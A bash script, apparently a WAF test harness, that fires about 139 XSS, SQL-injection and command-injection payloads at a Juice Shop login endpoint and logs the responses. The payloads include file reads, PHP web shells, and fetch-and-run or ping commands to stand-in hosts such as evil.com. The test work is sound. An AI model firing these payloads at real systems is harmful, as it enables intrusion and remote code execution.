#!/usr/bin/env bash
# REVISED: each curl injects a unique X-Request-Id and logs it to a mapping CSV.
# Run end-to-end, then run pull_raw_cloudwatch.py to fetch CF + ALB CW logs.
#
# Output:
#   $EVIDENCE_DIR/request_id_mapping.csv          (appended to)
#   $EVIDENCE_DIR/responses/<profile>/<rid>.txt   (full curl response per request)
#
# Override paths via env: EVIDENCE_DIR, MAPPING_FILE.
set -uo pipefail

USER_AGENT="dlpaasrngb6ue.cloudfront.net"
HOST="https://dlpaasrngb6ue.cloudfront.net"
URI="/rest/user/login"
METHOD_PROFILE="post_with_body"

EVIDENCE_DIR="${EVIDENCE_DIR:-$HOME/Downloads/evidence}"
MAPPING_FILE="${MAPPING_FILE:-$EVIDENCE_DIR/request_id_mapping.csv}"
RESP_DIR="$EVIDENCE_DIR/responses/$METHOD_PROFILE"
mkdir -p "$RESP_DIR" "$(dirname "$MAPPING_FILE")"

if [ ! -f "$MAPPING_FILE" ]; then
  echo '"method_profile","test_id","tuning","request_id","http_status","timestamp_utc","response_file"' > "$MAPPING_FILE"
fi

gen_rid() {
  if command -v uuidgen >/dev/null 2>&1; then
    printf 'waf-test-%s' "$(uuidgen | tr '[:upper:]' '[:lower:]')"
  else
    printf 'waf-test-%s' "$(python3 -c 'import uuid; print(uuid.uuid4())')"
  fi
}

# do_curl <test_id> <tuning> <payload-preview> -- <curl args...>
# (User-Agent + X-Request-Id are added automatically; do not pass them.)
do_curl() {
  local test_id="$1" tuning="$2" payload="$3"; shift 3
  local rid; rid="$(gen_rid)"
  echo "=== $test_id | tuning=$tuning | method=$METHOD_PROFILE | rid=$rid ==="
  printf '    payload: %s\n' "$payload"
  local resp_file="$RESP_DIR/$rid.txt"
  curl -sk -i -m 15 -H "X-Request-Id: $rid" -H "User-Agent: $USER_AGENT" "$@" > "$resp_file" 2>&1
  head -8 "$resp_file"
  local status; status="$(grep -m1 '^HTTP/' "$resp_file" | awk '{print $2}')"
  local ts; ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  printf '"%s","%s","%s","%s","%s","%s","%s"\n' \
    "$METHOD_PROFILE" "$test_id" "$tuning" "$rid" "$status" "$ts" "$resp_file" >> "$MAPPING_FILE"
  echo
}

# ---------- Tests ----------
do_curl 'juiceshop-0001' 'xss' '<script>alert(1)</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>alert(1)</script>"}'
do_curl 'juiceshop-0002' 'xss' '%253Cscript%253Ealert(1)%253C/script%253E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%253Cscript%253Ealert(1)%253C/script%253E"}'
do_curl 'juiceshop-0003' 'xss' '&lt;script&gt;alert(1)&lt;/script&gt;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&lt;script&gt;alert(1)&lt;/script&gt;"}'
do_curl 'juiceshop-0004' 'xss' '<scr<script>ipt>alert(1)</scr</script>ipt>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<scr<script>ipt>alert(1)</scr</script>ipt>"}'
do_curl 'juiceshop-0005' 'xss' '<script>alert&#40;1&#41;</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>alert&#40;1&#41;</script>"}'
do_curl 'juiceshop-0006' 'xss' '<script>alert\\x281\\x29</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>alert\\\\x281\\\\x29</script>"}'
do_curl 'juiceshop-0007' 'xss' '<script>alert\\u00281\\u0029</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>alert\\\\u00281\\\\u0029</script>"}'
do_curl 'juiceshop-0008' 'xss' '%u003Cscript%u003Ealert(1)%u003C/script%u003E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%u003Cscript%u003Ealert(1)%u003C/script%u003E"}'
do_curl 'juiceshop-0009' 'xss' '%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E"}'
do_curl 'juiceshop-0010' 'xss' '%3cscript%3ealert(1)%3c%2fscript%3e' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3cscript%3ealert(1)%3c%2fscript%3e"}'
do_curl 'juiceshop-0011' 'xss' '%3Csvg%20onload%3D%22confirm%28document.domain%29%22%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Csvg%20onload%3D%22confirm%28document.domain%29%22%3E"}'
do_curl 'juiceshop-0012' 'xss' '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"}'
do_curl 'juiceshop-0013' 'xss' '%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E"}'
do_curl 'juiceshop-0014' 'xss' '%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"}'
do_curl 'juiceshop-0015' 'xss' '%u003Cscript%u003Ealert(1)%u003C%2Fscript%u003E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%u003Cscript%u003Ealert(1)%u003C%2Fscript%u003E"}'
do_curl 'juiceshop-0016' 'xss' '"><script>alert(1)</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "\"><script>alert(1)</script>"}'
do_curl 'juiceshop-0017' 'xss' '<svg/onload=alert(1)>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<svg/onload=alert(1)>"}'
do_curl 'juiceshop-0018' 'xss' '<iframe src="javascript:alert(1)">' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<iframe src=\"javascript:alert(1)\">"}'
do_curl 'juiceshop-0019' 'xss' '<IMG SRC="javascript:alert('\''XSS'\'');">' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<IMG SRC=\"javascript:alert('\''XSS'\'');\">"}'
do_curl 'juiceshop-0020' 'xss' '<svg><script xlink:href=data:,alert(1)>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<svg><script xlink:href=data:,alert(1)>"}'
do_curl 'juiceshop-0021' 'xss' '<math><mi//xlink:href="data:x,alert(1)">' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<math><mi//xlink:href=\"data:x,alert(1)\">"}'
do_curl 'juiceshop-0022' 'xss' '<script>window </script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>window </script>"}'
do_curl 'juiceshop-0023' 'xss' '"><img src=x onerror=alert(1)>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "\"><img src=x onerror=alert(1)>"}'
do_curl 'juiceshop-0024' 'xss' '%3Cscript%3Ealert%281%29%3C%2Fscript%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"}'
do_curl 'juiceshop-0025' 'xss' '%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"}'
do_curl 'juiceshop-0026' 'xss' '<scr<script>ipt>alert(1)</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<scr<script>ipt>alert(1)</script>"}'
do_curl 'juiceshop-0027' 'xss' '<scri%00pt>alert(1)</scri%00pt>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<scri%00pt>alert(1)</scri%00pt>"}'
do_curl 'juiceshop-0028' 'xss' '<script>\\u0061lert(1)</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<script>\\\\u0061lert(1)</script>"}'
do_curl 'juiceshop-0029' 'xss' '<iframe/src=javascript:alert(1)>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<iframe/src=javascript:alert(1)>"}'
do_curl 'juiceshop-0030' 'xss' '<svg%0Aonload=alert(1)>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<svg%0Aonload=alert(1)>"}'
do_curl 'juiceshop-0031' 'xss' '"><img src=x o%6ener%72=alert(1)>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "\"><img src=x o%6ener%72=alert(1)>"}'
do_curl 'juiceshop-0032' 'xss' '%3Cscript%3Ealert(1)%3C%2Fscript%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"}'
do_curl 'juiceshop-0033' 'xss' '%3Csvg%2Fonload%3Dalert(1)%3E' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Csvg%2Fonload%3Dalert(1)%3E"}'
do_curl 'juiceshop-0034' 'xss' '<img src=x onerror=alert(1)>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<img src=x onerror=alert(1)>"}'
do_curl 'juiceshop-0035' 'xss' '&lt;img src=x onerror=alert(1)&gt;' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&lt;img src=x onerror=alert(1)&gt;"}'
do_curl 'juiceshop-0036' 'base64' 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}'
do_curl 'juiceshop-0037' 'xss' '<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>"}'
do_curl 'juiceshop-0038' 'xss' '?a=<scr&b=ipt>alert(1)</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "?a=<scr&b=ipt>alert(1)</script>"}'
do_curl 'juiceshop-0039' 'xss' '<scr + ipt>alert(1)</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "<scr + ipt>alert(1)</script>"}'
do_curl 'juiceshop-0040' 'xss' '< + script>alert(1)</script>' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "< + script>alert(1)</script>"}'
do_curl 'juiceshop-0041' 'sqli' ''\'' OR '\'' + 1=1 + --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR '\'' + 1=1 + --"}'
do_curl 'juiceshop-0042' 'sqli' 'id='\'' OR '\''&id=1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "id='\'' OR '\''&id=1=1--"}'
do_curl 'juiceshop-0043' 'sqli' ''\''/**/OR/**/1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''/**/OR/**/1=1--"}'
do_curl 'juiceshop-0044' 'sqli' ''\'' OR '\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR '\''1'\''='\''1"}'
do_curl 'juiceshop-0045' 'sqli' ''\'' OR 1=1 --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR 1=1 --"}'
do_curl 'juiceshop-0046' 'sqli' ''\'' OR 1=1#' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR 1=1#"}'
do_curl 'juiceshop-0047' 'sqli' ''\'') OR ('\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'') OR ('\''1'\''='\''1"}'
do_curl 'juiceshop-0048' 'sqli' 'admin'\'' --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "admin'\'' --"}'
do_curl 'juiceshop-0049' 'sqli' 'admin'\'' #' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "admin'\'' #"}'
do_curl 'juiceshop-0050' 'sqli' '%27%20OR%201=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20OR%201=1--"}'
do_curl 'juiceshop-0051' 'sqli' '%27%20OR%20%271%27=%271' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20OR%20%271%27=%271"}'
do_curl 'juiceshop-0052' 'sqli' '%27%20OR%20%271%27=%271%27--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20OR%20%271%27=%271%27--"}'
do_curl 'juiceshop-0053' 'sqli' '%2527%2520OR%25201%253D1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2527%2520OR%25201%253D1--"}'
do_curl 'juiceshop-0054' 'sqli' '%27OR+1%3D1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27OR+1%3D1--"}'
do_curl 'juiceshop-0055' 'sqli' '%27+OR+1%3D1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27+OR+1%3D1--"}'
do_curl 'juiceshop-0056' 'sqli' '%27--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27--+"}'
do_curl 'juiceshop-0057' 'xss' '%27%23' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%23"}'
do_curl 'juiceshop-0058' 'xss' '%2F%2A%2A%2F' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2F%2A%2A%2F"}'
do_curl 'juiceshop-0059' 'sqli' '%27)%20OR%20(%271%27=%271' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27)%20OR%20(%271%27=%271"}'
do_curl 'juiceshop-0060' 'sqli' ''\'')%20OR%20('\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'')%20OR%20('\''1'\''='\''1"}'
do_curl 'juiceshop-0061' 'sqli' ''\''||'\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||'\''1'\''='\''1"}'
do_curl 'juiceshop-0062' 'sqli' '%df'\'' OR 1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%df'\'' OR 1=1--"}'
do_curl 'juiceshop-0063' 'sqli' ''\'';WAITFOR DELAY '\''0:0:5'\''--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'';WAITFOR DELAY '\''0:0:5'\''--"}'
do_curl 'juiceshop-0064' 'sqli' ''\'' AND SLEEP(5)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' AND SLEEP(5)--"}'
do_curl 'juiceshop-0065' 'sqli' ''\''||UTL_INADDR.get_host_address('\''attacker.com'\'')||'\''' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||UTL_INADDR.get_host_address('\''attacker.com'\'')||'\''"}'
do_curl 'juiceshop-0066' 'sqli' '%27%20OR%201%3D1%20--%20' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20OR%201%3D1%20--%20"}'
do_curl 'juiceshop-0067' 'sqli' '%27)%20OR%20('\''1'\''%3D'\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27)%20OR%20('\''1'\''%3D'\''1"}'
do_curl 'juiceshop-0068' 'sqli' '%25%27%20OR%20%271%27%3D%271' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%25%27%20OR%20%271%27%3D%271"}'
do_curl 'juiceshop-0069' 'sqli' '%27%20OR%201=1%20--%20' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20OR%201=1%20--%20"}'
do_curl 'juiceshop-0070' 'sqli' '%27%20UNION%20SELECT%201,2,3--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20UNION%20SELECT%201,2,3--"}'
do_curl 'juiceshop-0071' 'sqli' 'admin%27--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "admin%27--+"}'
do_curl 'juiceshop-0072' 'sqli' 'admin%27%2f%2a%2a%2f--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "admin%27%2f%2a%2a%2f--"}'
do_curl 'juiceshop-0073' 'sqli' '%27/**/OR/**/1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27/**/OR/**/1=1--"}'
do_curl 'juiceshop-0074' 'sqli' '%27%2bOR%2b1%3d1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%2bOR%2b1%3d1--"}'
do_curl 'juiceshop-0075' 'sqli' '%60%27%20OR%201=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%60%27%20OR%201=1--"}'
do_curl 'juiceshop-0076' 'sqli' '%2527%2520OR%25201%253D1--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2527%2520OR%25201%253D1--+"}'
do_curl 'juiceshop-0077' 'sqli' '%27%2b%4f%52%2b1%3d1--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%2b%4f%52%2b1%3d1--+"}'
do_curl 'juiceshop-0078' 'sqli' '%2527%2f%2a%2a%2f%2bOR%2b1%3D1--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2527%2f%2a%2a%2f%2bOR%2b1%3D1--+"}'
do_curl 'juiceshop-0079' 'sqli' '%27||CHR(65)||CHR(66)||CHR(67)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27||CHR(65)||CHR(66)||CHR(67)--"}'
do_curl 'juiceshop-0080' 'sqli' '0%27%20UNION%20SELECT%20null,null,null--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "0%27%20UNION%20SELECT%20null,null,null--+"}'
do_curl 'juiceshop-0081' 'sqli' ''\'' OR 1=1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR 1=1--"}'
do_curl 'juiceshop-0082' 'sqli' '" OR "1"="1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "\" OR \"1\"=\"1"}'
do_curl 'juiceshop-0083' 'sqli' ''\'')--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'')--"}'
do_curl 'juiceshop-0084' 'sqli' ''\'' UNION SELECT null,null--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' UNION SELECT null,null--"}'
do_curl 'juiceshop-0085' 'sqli' ''\'' AND 1=CAST((SELECT @@version) AS int)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' AND 1=CAST((SELECT @@version) AS int)--"}'
do_curl 'juiceshop-0086' 'sqli' ''\'' AND EXISTS (SELECT * FROM' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' AND EXISTS (SELECT * FROM"}'
do_curl 'juiceshop-0087' 'sqli' '1'\'' AND '\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' AND '\''1'\''='\''1"}'
do_curl 'juiceshop-0088' 'sqli' 'admin'\''--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "admin'\''--"}'
do_curl 'juiceshop-0089' 'sqli' ''\'' OR '\''a'\''='\''a' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR '\''a'\''='\''a"}'
do_curl 'juiceshop-0090' 'sqli' '1=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1=1"}'
do_curl 'juiceshop-0091' 'sqli' '1'\'' AND 1=0 UNION SELECT null, version() --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' AND 1=0 UNION SELECT null, version() --"}'
do_curl 'juiceshop-0092' 'sqli' '1'\''; EXEC xp_cmdshell('\''whoami'\'') --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\''; EXEC xp_cmdshell('\''whoami'\'') --"}'
do_curl 'juiceshop-0093' 'sqli' '1'\'') OR ('\''1'\''='\''1'\'' --' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'') OR ('\''1'\''='\''1'\'' --"}'
do_curl 'juiceshop-0094' 'sqli' '1'\'') AND sleep(5)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'') AND sleep(5)--"}'
do_curl 'juiceshop-0095' 'sqli' '%27%20OR%20%271%27%3D%271' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20OR%20%271%27%3D%271"}'
do_curl 'juiceshop-0096' 'sqli' '1%27%20AND%201%3D1%20--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1%27%20AND%201%3D1%20--"}'
do_curl 'juiceshop-0097' 'sqli' '1%27)%20OR%20(%271%27%3D%271' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1%27)%20OR%20(%271%27%3D%271"}'
do_curl 'juiceshop-0098' 'base64' 'JyBPUiAnMT0nJz0nMQ==' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "JyBPUiAnMT0nJz0nMQ=="}'
do_curl 'juiceshop-0099' 'sqli' ''\''/**/OR/**/'\''1'\''/**/=/**/'\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''/**/OR/**/'\''1'\''/**/=/**/'\''1"}'
do_curl 'juiceshop-0100' 'sqli' ''\''UNION/**/SELECT/**/NULL,NULL--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''UNION/**/SELECT/**/NULL,NULL--"}'
do_curl 'juiceshop-0101' 'sqli' '1%a0OR%a01=1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1%a0OR%a01=1"}'
do_curl 'juiceshop-0102' 'sqli' '1'\''/*!50000OR*/'\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\''/*!50000OR*/'\''1'\''='\''1"}'
do_curl 'juiceshop-0103' 'sqli' '1/**/UNION/**/SELECT/**/version()--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1/**/UNION/**/SELECT/**/version()--"}'
do_curl 'juiceshop-0104' 'xss' ''\''#' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''#"}'
do_curl 'juiceshop-0105' 'sqli' 'admin'\''--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "admin'\''--"}'
do_curl 'juiceshop-0106' 'sqli' ''\'' AND sleep(5)--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' AND sleep(5)--"}'
do_curl 'juiceshop-0107' 'sqli' ''\'' OR 1=1 LIMIT 1 OFFSET 1--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR 1=1 LIMIT 1 OFFSET 1--"}'
do_curl 'juiceshop-0108' 'sqli' ''\''||UTL_INADDR.get_host_address('\''evil.com'\'')||' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''||UTL_INADDR.get_host_address('\''evil.com'\'')||"}'
do_curl 'juiceshop-0109' 'sqli' ''\''/*!50000UNION*/ SELECT 1,2--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''/*!50000UNION*/ SELECT 1,2--"}'
do_curl 'juiceshop-0110' 'sqli' ''\''UNION SELECT /*!12345null*/,version()#' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\''UNION SELECT /*!12345null*/,version()#"}'
do_curl 'juiceshop-0111' 'sqli' ''\'' /*!OR*/ '\''1'\''='\''1' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' /*!OR*/ '\''1'\''='\''1"}'
do_curl 'juiceshop-0112' 'sqli' ''\'' OR 1=1-- -' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR 1=1-- -"}'
do_curl 'juiceshop-0113' 'sqli' '1'\'' OR '\''1'\''='\''1'\'' --+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "1'\'' OR '\''1'\''='\''1'\'' --+"}'
do_curl 'juiceshop-0114' 'sqli' ''\'' OR 1=1;--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'' OR 1=1;--+"}'
do_curl 'juiceshop-0115' 'sqli' '%27%20OR%201%3D1--+' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27%20OR%201%3D1--+"}'
do_curl 'juiceshop-0116' 'sqli' '%27/*!UNION*/%20SELECT%201,2--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%27/*!UNION*/%20SELECT%201,2--"}'
do_curl 'juiceshop-0117' 'sqli' '%2527%2520OR%25201%253D1%2520--' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2527%2520OR%25201%253D1%2520--"}'
do_curl 'juiceshop-0118' 'cmdi' ';`id`' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": ";`id`"}'
do_curl 'juiceshop-0119' 'sqli' '%26%26sleep%205' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%26%26sleep%205"}'
do_curl 'juiceshop-0120' 'xss' '%26%26cat%20/etc/passwd' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%26%26cat%20/etc/passwd"}'
do_curl 'juiceshop-0121' 'xss' '%3Bping%20-c%204%20evil.com' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%3Bping%20-c%204%20evil.com"}'
do_curl 'juiceshop-0122' 'xss' '%60whoami%60' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%60whoami%60"}'
do_curl 'juiceshop-0123' 'xss' '|curl$\{IFS\}evil.com' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "|curl$\\{IFS\\}evil.com"}'
do_curl 'juiceshop-0124' 'xss' '|wget$\{IFS\}attacker.site%2fshell.sh' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "|wget$\\{IFS\\}attacker.site%2fshell.sh"}'
do_curl 'juiceshop-0125' 'cmdi' '%2526%2526whoami' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%2526%2526whoami"}'
do_curl 'juiceshop-0126' 'cmdi' '$\{@print(md5(1234))\}' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "$\\{@print(md5(1234))\\}"}'
do_curl 'juiceshop-0127' 'xss' 'php://input' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "php://input"}'
do_curl 'juiceshop-0128' 'xss' ''\'';phpinfo();/*' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'';phpinfo();/*"}'
do_curl 'juiceshop-0129' 'xss' 'eval(base64_decode($_GET[cmd]))' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "eval(base64_decode($_GET[cmd]))"}'
do_curl 'juiceshop-0130' 'xss' 'system($_GET['\''cmd'\''])' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "system($_GET['\''cmd'\''])"}'
do_curl 'juiceshop-0131' 'xss' '%60curl$\{IFS\}attacker.com%60' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "%60curl$\\{IFS\\}attacker.com%60"}'
do_curl 'juiceshop-0132' 'xss' ''\'';`wget attacker.sh`;//' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "'\'';`wget attacker.sh`;//"}'
do_curl 'juiceshop-0133' 'cmdi' ';id' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": ";id"}'
do_curl 'juiceshop-0134' 'xss' '| whoami' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "| whoami"}'
do_curl 'juiceshop-0135' 'xss' '`whoami`' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "`whoami`"}'
do_curl 'juiceshop-0136' 'xss' '& uname -a' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "& uname -a"}'
do_curl 'juiceshop-0137' 'xss' '&& ping -c 3 attacker.com' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "&& ping -c 3 attacker.com"}'
do_curl 'juiceshop-0138' 'xss' '| powershell -Command "whoami"' \
  -X POST "$HOST$URI" -H 'Content-Type: application/json' -d '{"q": "| powershell -Command \"whoami\""}'
do_curl 'juiceshop-0139' 'xss' '; curl http://evil.com/shell.sh | sh' \
